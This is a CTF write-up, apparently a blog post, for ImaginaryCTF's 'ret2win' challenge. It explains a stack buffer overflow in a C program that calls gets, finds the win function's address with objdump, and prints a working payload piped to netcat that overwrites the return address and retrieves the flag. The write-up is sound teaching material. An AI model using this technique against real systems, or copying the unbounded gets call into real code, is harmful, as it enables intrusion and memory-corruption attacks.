---
layout: post
title: "ret2win CTF Writeup"
excerpt: One of the most common exploit problems presented in CTFs are "ret2win" problems. Naturally ImaginaryCTF has a 100 point ret2win to get noobies their toes wet and experienced players a chance to warm.
---

## The Problem

One of the most common exploit problems presented in CTFs are "ret2win" problems.
Naturally ImaginaryCTF has a 100 point ret2win to get noobies their toes wet and
experienced players a chance to warm. The challenge, titled "ret2win", gives the
description:

> Jumping around memory is hard. I'll give you some help so that you can pwn this!

This is accompanied by 2 attachments and a netcat command to talk to the server the challenge
is running on.

[vuln](https://imaginaryctf.org/r/W94dw#vuln)
[vuln.c](https://imaginaryctf.org/r/IDlsV#vuln.c)
`nc ret2win.chal.imaginaryctf.org 1337`

## The Source, a binary, and the Server Soon To Be Pwned

Running the binary presents the user with a prompt:

```
Welcome to ret2win!
Right now I'm going to read in input.
Can you overwrite the return address?
```

As far as ret2win's go, this one is certainly handing the answer on a silver platter.
Once the user has given the program its input, another line is presented.

```
Returning to 0x7f97cc429290...
```

This address being returned will become very useful in a bit. However, lets move on the source code.

```c
#include <stdio.h>
#include <stdlib.h>

int win() {
  FILE *fp;
  char flag[255];
  fp = fopen("flag.txt", "r");
  fgets(flag, 255, fp);
  puts(flag);
}

char **return_address;

int main() {
  char buf[16];
  return_address = buf+24;

  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);

  puts("Welcome to ret2win!");
  puts("Right now I'm going to read in input.");
  puts("Can you overwrite the return address?");

  gets(buf);

  printf("Returning to %p...\n", *return_address);
}
```

The first thing that will catch your eye is the `int win()` function. Reading it carefully you will
see that this function opens the flag file and spits it out to the user. Great! This is what we need.
Looking at the `main()` function we see that a 16 byte buffer is allocated to the stack, the `return_address`
global variable is set to 24 bytes offset from the buffer (seemingly out of bounds). Then, the start message
we saw is displayed, a string is read into `buf`, and the address `return_address` points to is displayed.

However, there is something wrong here. The `win` function is never called. So this challenge must not be
possible right? Well, it is, but we need a bit of knowledge of how x86 uses the stack and a buffer overflow.

## The Stack Demystified

Operating systems like Linux use the stack in a predictable way. When entering a function, they save a
pointer to where they left off on the stack. This pointer is what is popped off when `return` is called
and the program must got back to whence it came. After entering a function, a pointer to the base of the
last stack frame (`ebp`) is usually saved (unless the stack isn't used in that function), and any stack allocated
variables are pushed to the end.

For instance, our main functions stack would look like below (first row is highest addresses):

||||
| --- | --- |
| 0xFFFFFFFF | ... |
| 0xFFFFFFF8 | `return_address` |
| 0xFFFFFFF0 | `ebp` |
| 0xFFFFFFE0 | `buf` |

So, since our goal is to run `win` to get our flag value, maybe instead of having main return to `return_address` we
could somehow have it return to a different address; Say the start of `win`. For this we will need one more thing: a
buffer overflow.

## Buffer Overflow

You may notice that the call to `gets` doesn't have a length parameter. That is because it is not bounds checked.
It simply continues taking in characters and writing to its buffer until input ends. Well since `buf` is right
below `ebp` and `return_address` in the stack, this means that itcould potentially overwrite those values if
we input more than 16 characters. Let's test this theory. For our input let's enter "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".

```
Welcome to ret2win!
Right now I'm going to read in input.
Can you overwrite the return address?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Returning to 0x6161616161616161...
[1]    637 segmentation fault (core dumped)  ./vuln
```

We crashed! You'll see the address we tried to while invalid is exactly what we wanted: a bunch of 'a's or 0x61 in hex
in the return address. Now we just have to carefully craft our input overwrite the `return_address` with `win`s starting address.

To get `win`s starting address we can use a linux utility called `objdump`. This program will take in a binary and
spit out its assembly code along with any symbols it can find. Running `objdump -D ./vuln` will display a lot of assembly code including...

```asm
00000000004011d6 <win>:
  4011d6:       f3 0f 1e fa             endbr64
  4011da:       55                      push   %rbp
  4011db:       48 89 e5                mov    %rsp,%rbp
  4011de:       48 81 ec 10 01 00 00    sub    $0x110,%rsp
  4011e5:       48 8d 35 1c 0e 00 00    lea    0xe1c(%rip),%rsi        # 402008 <_IO_stdin_used+0x8>
  4011ec:       48 8d 3d 17 0e 00 00    lea    0xe17(%rip),%rdi        # 40200a <_IO_stdin_used+0xa>
  4011f3:       e8 e8 fe ff ff          call   4010e0 <fopen@plt>
  4011f8:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  4011fc:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
  401200:       48 8d 85 f0 fe ff ff    lea    -0x110(%rbp),%rax
  401207:       be ff 00 00 00          mov    $0xff,%esi
  40120c:       48 89 c7                mov    %rax,%rdi
  40120f:       e8 9c fe ff ff          call   4010b0 <fgets@plt>
  401214:       48 8d 85 f0 fe ff ff    lea    -0x110(%rbp),%rax
  40121b:       48 89 c7                mov    %rax,%rdi
  40121e:       e8 6d fe ff ff          call   401090 <puts@plt>
  401223:       90                      nop
  401224:       c9                      leave
  401225:       c3                      ret
```

We have it! The address we need to jump to is `0x4011d6`. Now we can move on to our attack.

## The Exploit

To craft our payload, I'll just be using `echo`, but other
methods can also work to send non-character data. First, we will send 16 'a's to just fill up the buffer. Then, another
8 bytes of any non-zero values. Lastly, we send `0x4011d6` in little endian as a 64 bit number. When, going over netcat
it will be necessary that we also send a newline since the input buffer is still open.

```sh
❯ echo -n -e '\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xbb\xd6\x11\x40\x00\x00\x00\x00\x00\n' | nc ret2win.chal.imaginaryctf.org 1337
== proof-of-work: disabled ==
Welcome to ret2win!
Right now I'm going to read in input.
Can you overwrite the return address?
Returning to 0x4011d6...
ictf{c0ngrats_on_pwn_number_1_9b1e2f30}
```

> ictf{c0ngrats_on_pwn_number_1_9b1e2f30}

We got our flag and 100 points! If you've made it this far, I hope you learned a thing or two about how stacks and
buffer overflows work. Now get out there and pwn some more CTF's.

Happy Hacking.

